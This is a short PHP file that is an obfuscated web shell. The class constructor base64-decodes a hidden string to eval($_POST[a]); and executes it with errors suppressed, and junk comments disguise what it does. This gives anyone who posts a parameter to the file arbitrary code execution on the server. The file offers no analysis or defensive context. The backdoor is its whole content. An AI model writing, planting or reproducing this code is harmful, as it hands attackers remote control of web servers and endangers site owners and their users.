<?php
class x
{
        public $payload = null;
        public $decode_payload = null;
        function __construct()
        {       $this->payload='ZXZhbCgkX1BPU1RbYV0pOw==';
                $this->decode_payload = @base64_decode( $this->payload );
                @eval("/*saadfsssdasdsadasdsdadsdasas23123*/".$this->decode_payload."/*sdfw3sdfw3123sdfw3123sdfw3123sdfw3123sdfw3123sdfw3123sdfw3123sdfw3123sdfw3123123*/");
        }

}
new x();

?>